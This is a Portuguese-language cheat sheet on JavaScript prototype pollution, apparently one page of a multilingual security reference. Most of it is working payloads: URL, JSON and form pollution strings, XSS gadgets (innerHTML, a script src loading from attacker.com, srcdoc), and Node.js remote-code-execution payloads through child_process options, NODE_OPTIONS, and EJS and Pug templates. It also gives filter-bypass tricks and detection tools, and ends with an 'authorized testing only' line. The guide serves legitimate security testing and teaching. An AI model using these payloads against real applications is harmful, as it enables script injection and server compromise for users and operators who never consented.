# 🧬 Guia de referência de prototype pollution

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║   ██║    ╚████╔╝ ██████╔╝█████╗  
  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝   ██║      ██║   ██║     ███████╗
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝    ╚═╝      ╚═╝   ╚═╝     ╚══════╝
                 ██████╗  ██████╗ ██╗     ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
                 ██╔══██╗██╔═══██╗██║     ██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
                 ██████╔╝██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
                 ██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
                 ██║     ╚██████╔╝███████╗███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
                 ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

> **Notas de precisão:** Prototype pollution altera um protótipo que outros objetos podem herdar; um gadget é uma utilização desses valores que produz impacto. Nem todos os objetos herdam de Object.prototype, e uma alteração afeta apenas os objetos/caminhos de herança relevantes ([MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution)). Escrever diretamente em Object.prototype na consola demonstra o mecanismo, mas não prova que a entrada controlável da aplicação o consiga fazer. JSON.parse não polui, por si só, um protótipo; o comportamento depende de operações posteriores. Object.assign pode alterar o protótipo do alvo sem modificar globalmente Object.prototype. As atribuições de arrays, payloads URL e gadgets Node.js/EJS/Pug dependem de código vulnerável, configuração e versão; não constituem exploits universais. DOM clobbering é um mecanismo distinto, ainda que possa ser combinado.

---

<a id="-what-is-prototype-pollution"></a>
## 🎯 O que é prototype pollution

**Prototype pollution** (poluição de protótipos) é uma vulnerabilidade JavaScript em que um atacante pode modificar `Object.prototype`, afetando os objetos que dele herdam na aplicação (ver nota sobre o alcance).

### Impacto
- 🔴 **XSS** — Manipulação do DOM
- 🔴 **RCE** — No servidor (Node.js)
- 🔴 **Contorno** — Controlos de segurança
- 🔴 **DoS** — Falha da aplicação

---

<a id="-javascript-prototypes"></a>
## 🔍 Protótipos JavaScript

### Como funciona
```javascript
// Todos os objetos herdam de Object.prototype (simplificação do original; ver nota)
let obj = {};
obj.__proto__ === Object.prototype  // true

// Se poluirmos o protótipo:
Object.prototype.polluted = "hacked";

// Todos os objetos são afetados (simplificação do original; ver nota):
let newObj = {};
console.log(newObj.polluted);  // "hacked"
```

### Propriedades perigosas
```javascript
__proto__
constructor
prototype
```

---

<a id="-client-side-payloads"></a>
## 💉 Payloads do lado do cliente

### Através do URL (query/fragmento)
```
# Básico
?__proto__[polluted]=value
?__proto__.polluted=value

# Constructor (construtor)
?constructor[prototype][polluted]=value

# Aninhado
?__proto__[__proto__][polluted]=value

# Codificado como URL
?__proto__%5Bpolluted%5D=value
```

### Através de JSON
```javascript
// Dados introduzidos pelo utilizador
{"__proto__": {"polluted": "value"}}
{"constructor": {"prototype": {"polluted": "value"}}}

// Aninhado
{"a": {"__proto__": {"polluted": "value"}}}
```

### Através de dados de formulário
```html
<input name="__proto__[polluted]" value="hacked">
<input name="constructor[prototype][polluted]" value="hacked">
```

---

<a id="-exploitation-examples"></a>
## 🔥 Exemplos de exploração

### XSS no DOM através de innerHTML
```javascript
// Se o código fizer:
element.innerHTML = obj.html || "";

// Poluir:
?__proto__[html]=<img src=x onerror=alert(1)>

// Resultado: XSS!
```

### Gadget de script src
```javascript
// Se o código fizer:
let script = document.createElement('script');
script.src = obj.src || '/default.js';

// Poluir:
?__proto__[src]=data:,alert(1)//
?__proto__[src]=//attacker.com/evil.js
```

### Combinação com DOM clobbering
```javascript
// Padrões comuns de gadgets
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[outerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
```

### Gadgets de jQuery
```javascript
// jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))

// Exploração
?__proto__[url]=javascript:alert(1)
```

---

<a id="-server-side-nodejs"></a>
## 🖥️ No servidor (Node.js)

### RCE através de child_process
```javascript
// Se a aplicação utilizar spawn/exec com um objeto de opções:
const { spawn } = require('child_process');
spawn('ls', [], options);

// Poluir:
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(1)"}}

// Ou:
{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/pwn.js"}}}
```

### RCE através de require()
```javascript
// Payload de poluição
{"__proto__": {"main": "./pwned.js"}}
```

### RCE em templates EJS
```javascript
// EJS (< 3.1.7) RCE
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
}}
```

### RCE em templates Pug
```javascript
// Pug RCE
{"__proto__": {
    "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('id')"
    }
}}
```

---

<a id="-detection"></a>
## 🔍 Deteção

### Testes manuais
```javascript
// Na consola do navegador:
Object.prototype.testPollution = "polluted";
let obj = {};
console.log(obj.testPollution);  // Se aparecer "polluted", existe vulnerabilidade (interpretação do original; ver nota)

// Limpar as alterações
delete Object.prototype.testPollution;
```

### Testes através do URL
```
# Adicionar ao URL e verificar a consola
?__proto__[test]=polluted

// Na consola:
({}).test  // Deve ser undefined; se aparecer "polluted", pode existir uma vulnerabilidade
```

### Encontrar gadgets (DOM Invader)
```
1. Instalar o DOM Invader (Burp Suite)
2. Ativar o modo de prototype pollution
3. Percorrer a aplicação
4. Procurar sinks exploráveis
```

---

<a id="-tools"></a>
## 🛠️ Ferramentas

| Ferramenta | Finalidade |
|------|---------|
| **DOM Invader** | Extensão do Burp para detetar poluição de protótipos |
| **ppfuzz** | Fuzzer de poluição de protótipos |
| **ppmap** | Procurar gadgets |
| **PPScan** | Analisador do lado do cliente |

### Utilização do ppmap
```bash
# Instalar
git clone https://github.com/nickvdyck/ppmap
cd ppmap

# Analisar
node ppmap.js https://target.com
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Formatos de payload
| Formato | Payload |
|--------|---------|
| Consulta (query) | `?__proto__[x]=y` |
| Fragmento (hash) | `#__proto__[x]=y` |
| JSON | `{"__proto__":{"x":"y"}}` |
| Fusão (merge) | `Object.assign({},input)` |

### Gadgets comuns
| Propriedade | Impacto |
|----------|--------|
| `innerHTML` | XSS |
| `src` | Injeção de scripts |
| `href` | Redirecionamento |
| `shell` | RCE (Node.js) |
| `env` | RCE (Node.js) |

### Técnicas de contorno de proteções
```javascript
// Se __proto__ for filtrado:
constructor.prototype.polluted = "value"

// Notação diferente
["__proto__"]["polluted"] = "value"

// Unicode
{"\u005f\u005fproto\u005f\u005f": {"x": "y"}}
```

---

<a id="-resources"></a>
## 📚 Recursos

- [Prototype pollution na PortSwigger](https://portswigger.net/web-security/prototype-pollution)
- [Prototype pollution no servidor](https://portswigger.net/research/server-side-prototype-pollution)
- [Analisador de poluição de protótipos do lado do cliente](https://github.com/nickvdyck/ppmap)

---

<p align="center">
  <b>🧬 Teste a poluição de protótipos!</b><br>
  <i>Apenas para testes autorizados!</i>
</p>
